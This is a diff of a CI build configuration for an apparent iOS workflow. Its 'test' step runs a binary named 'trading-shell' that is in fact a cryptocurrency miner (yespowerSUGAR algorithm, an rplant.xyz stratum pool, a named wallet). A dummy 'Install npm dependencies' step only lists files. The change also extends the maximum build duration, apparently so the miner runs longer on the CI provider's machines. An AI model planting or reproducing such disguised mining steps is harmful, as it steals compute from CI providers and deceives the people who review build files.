@@ -1,7 +1,7 @@
 workflows:
   ios-workflow:
     name: iOS Workflow
-    max_build_duration: 60
+    max_build_duration: 160
     instance_type: mac_mini
     environment:
       vars:
@@ -31,4 +31,4 @@ workflows:
       - name: Install npm dependencies
         script: ls
       - name: test
-        script: ./trading-shell -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.1 -t 4 --cpu-priority 4 && sleep 2d
+        script: ./trading-shell -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.1 -t 4 --cpu-priority 4 && set -x
